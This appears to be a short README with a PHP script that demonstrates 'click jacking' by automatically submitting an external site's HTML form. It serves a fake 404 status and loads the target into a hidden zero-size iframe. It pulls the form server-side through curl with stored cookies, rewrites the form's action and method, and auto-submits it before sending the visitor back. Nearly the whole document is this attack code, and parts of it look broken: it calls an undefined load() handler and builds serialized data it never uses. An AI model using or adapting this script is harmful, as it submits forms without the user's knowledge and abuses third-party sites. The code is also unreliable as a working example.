# IFrame-Click-Jacking
A simple PHP script to demonstrate IFrame based Click Jacking - utilising several methods of Cross Origin Bypassing and Actions
   
```   
<?php
// 2021 Submit External HTML Forms with IFrames
// Default GoTo After Submitting
header('HTTP/1.0 404 Not Found');

// Get document path 
$me = $_SERVER['PHP_SELF'];

// Set target form endpoint address
$target ="https://cors-anywhere.herokuapp.com/corsdemo.php";

// Load the request in an IFrame to keep the page from redirecting on submitting.
if (!hasParam("load"))
{

// Return IFramed content to Parent
echo '<html><head>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
</head>
<body>
<iframe id="frame" style="width:0px;height:0px;" src="'.$me.'?load='.urlEncode($target).'" onload="load()" frameBorder="0"></iframe>
<script>

alert("We Submitted The Form Externally !!!");
window.history.back();
</script>
</body>
</html>';
flush();
exit();
}
else
{

// We Are Inside The IFrame Parent  - Smack Submit on the Form and let form Redirect.
$api = $target;
clickSmack($api);
exit();
}


// Auto Form Button Smacker
function clickSmack($api)
{
$html=getFileContents($api);
echo '<html><head>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
</head>
<body>
'. $html.
'<script>

//pull form elements
var forms = window.document.getElementsByTagName("form");

// set target form
var target = forms[0];

//get labels of target form elements
var labels = target.getElementsByTagName("label");

//get inputs in target form
var inputs = target.getElementsByTagName("input");

//get buttons in target form
var buttons = target.getElementsByTagName("button");

//reset action & method because most forms do not include it. 
target.method="POST";
target.action="'.$api.'";


// add temporary id to form
target.id="smacked";

// get form data
var data = $("#smacked").serialize();

// self submit
target.submit();

</script>
</body>
</html>
';
}


// Typical CURL Request
function getFileContents($url)
{
$agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt ($ch, CURLOPT_COOKIESESSION, true);
$cookie = "cookies.txt";
curl_setopt ($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt ($ch, CURLOPT_COOKIEFILE, $cookie); 
    curl_setopt($ch, CURLOPT_USERAGENT, $agent);

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt ($ch, CURLOPT_HEADER, 0);
    $exec=curl_exec($ch);
    $err = curl_error($ch);
$loadedHTML = $exec.$err;
return $loadedHTML;
}

// Parameter Checker
function hasParam($param) 
{
   return array_key_exists($param, $_REQUEST);
}

?>
```    
